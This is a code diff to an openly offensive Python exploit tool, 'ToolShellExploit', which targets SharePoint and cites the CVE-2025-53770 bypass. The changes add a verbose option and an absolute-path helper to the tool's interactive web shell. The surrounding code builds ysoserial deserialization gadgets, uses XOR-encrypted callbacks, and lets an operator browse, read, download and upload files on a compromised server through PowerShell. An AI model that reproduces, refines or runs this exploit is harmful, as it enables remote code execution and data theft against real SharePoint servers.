@@ -109,7 +109,7 @@ def xor_decrypt(data_b64: str, key: str) -> str:
 
 
 class ToolShellExploit:
-    def __init__(self, target, proxy=None, timeout=30, ysoserial_path=None):
+    def __init__(self, target, proxy=None, timeout=30, ysoserial_path=None, verbose=False):
         global CALLBACK_XOR_KEY
         self.target = target.rstrip('/')
         self.timeout = timeout
@@ -119,6 +119,7 @@ class ToolShellExploit:
         self.user_agent = get_random_ua()  # Random UA per session
         self.use_bypass = False  # Will be set automatically if needed
         self.bypass_mode_active = False  # Track if we're using CVE-2025-53770 bypass
+        self.verbose = verbose  # Control debug output verbosity
         
         # Generate XOR key for encrypted callbacks
         CALLBACK_XOR_KEY = generate_xor_key()
@@ -370,7 +371,8 @@ class ToolShellExploit:
                 '-o', 'gzip'
             ]
             
-            print(f"[*] Executing: {' '.join(cmd)}")
+            if self.verbose:
+                print(f"[*] Executing: {' '.join(cmd)}")
             
             result = subprocess.run(
                 cmd,
@@ -381,7 +383,8 @@ class ToolShellExploit:
             
             if result.returncode == 0 and result.stdout.strip():
                 compressed_gadget = result.stdout.strip()
-                print(f"[+] Generated compressed gadget: {len(compressed_gadget)} chars (gzip+base64)")
+                if self.verbose:
+                    print(f"[+] Generated compressed gadget: {len(compressed_gadget)} chars (gzip+base64)")
                 return ('datasetxml', compressed_gadget)
             
             # DataSetXML gadget not available - this is the custom gadget
@@ -537,6 +540,10 @@ runat="server" AssociatedUpdatePanelID="upTest">
             except Exception as e:
                 return None, str(e)
         
+        def is_absolute_path(p):
+            """Check if path is absolute (drive letter or UNC)"""
+            return (len(p) >= 2 and p[1] == ':') or p.startswith('\\\\')
+        
         try:
             while True:
                 try:
@@ -587,7 +594,7 @@ runat="server" AssociatedUpdatePanelID="upTest">
                     
                     if cmd.lower().startswith('ls ') or cmd.lower().startswith('dir '):
                         path = cmd[3:].strip() if cmd.lower().startswith('ls ') else cmd[4:].strip()
-                        if not path.startswith('C:') and not path.startswith('\\\\'):
+                        if not is_absolute_path(path):
                             sep = '\\'
                             path = cwd.rstrip(sep) + sep + path
                         ps_cmd = f"Get-ChildItem -Path '{path}' | Format-Table Mode,LastWriteTime,Length,Name -AutoSize"
@@ -608,8 +615,8 @@ runat="server" AssociatedUpdatePanelID="upTest">
                                 cwd = 'C:\\'
                             elif not cwd.endswith('\\'):
                                 cwd += '\\'
-                        elif new_path.startswith('C:') or new_path.startswith('\\\\'):
-                            # Absolute path
+                        elif len(new_path) >= 2 and new_path[1] == ':' or new_path.startswith('\\\\'):
+                            # Absolute path (drive letter or UNC)
                             cwd = new_path if new_path.endswith('\\') else new_path + '\\'
                         else:
                             # Relative path
@@ -633,7 +640,7 @@ runat="server" AssociatedUpdatePanelID="upTest">
                     # cat command
                     if cmd.lower().startswith('cat '):
                         filepath = cmd[4:].strip()
-                        if not filepath.startswith('C:') and not filepath.startswith('\\\\'):
+                        if not is_absolute_path(filepath):
                             sep = '\\'
                             filepath = cwd.rstrip(sep) + sep + filepath
                         ps_cmd = f"Get-Content -Path '{filepath}' -Raw"
@@ -648,7 +655,7 @@ runat="server" AssociatedUpdatePanelID="upTest">
                     if cmd.lower().startswith('download '):
                         parts = cmd[9:].strip().split(' ', 1)
                         remote_path = parts[0]
-                        if not remote_path.startswith('C:') and not remote_path.startswith('\\\\'):
+                        if not is_absolute_path(remote_path):
                             sep = '\\'
                             remote_path = cwd.rstrip(sep) + sep + remote_path
                         
@@ -678,7 +685,7 @@ runat="server" AssociatedUpdatePanelID="upTest">
                             continue
                         local_path = parts[0]
                         remote_path = parts[1]
-                        if not remote_path.startswith('C:') and not remote_path.startswith('\\\\'):
+                        if not is_absolute_path(remote_path):
                             sep = '\\'
                             remote_path = cwd.rstrip(sep) + sep + remote_path
                         
@@ -1541,7 +1548,8 @@ Examples:
         args.target, 
         proxy=args.proxy, 
         timeout=args.timeout,
-        ysoserial_path=args.ysoserial
+        ysoserial_path=args.ysoserial,
+        verbose=args.verbose
     )
     
     # Get SharePoint version
